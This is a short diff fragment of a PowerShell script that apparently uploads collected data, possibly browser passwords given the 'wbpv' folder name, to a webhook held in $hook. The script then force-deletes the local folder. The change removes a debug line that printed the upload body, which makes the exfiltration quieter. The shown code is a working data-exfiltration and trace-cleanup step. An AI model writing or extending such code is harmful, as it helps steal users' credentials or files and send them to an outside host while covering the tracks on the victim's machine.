@@ -48,7 +48,6 @@ $body = (
     ('--' + $boundary + '--' + $LF)
 ) -join $LF;
 
-Write-Output $body
 Invoke-WebRequest -Uri $hook -ContentType ('multipart/form-data; boundary=' + $boundary) -Method Post -Body $body;
 
 Remove-Item 'wbpv' -Force -Recurse;
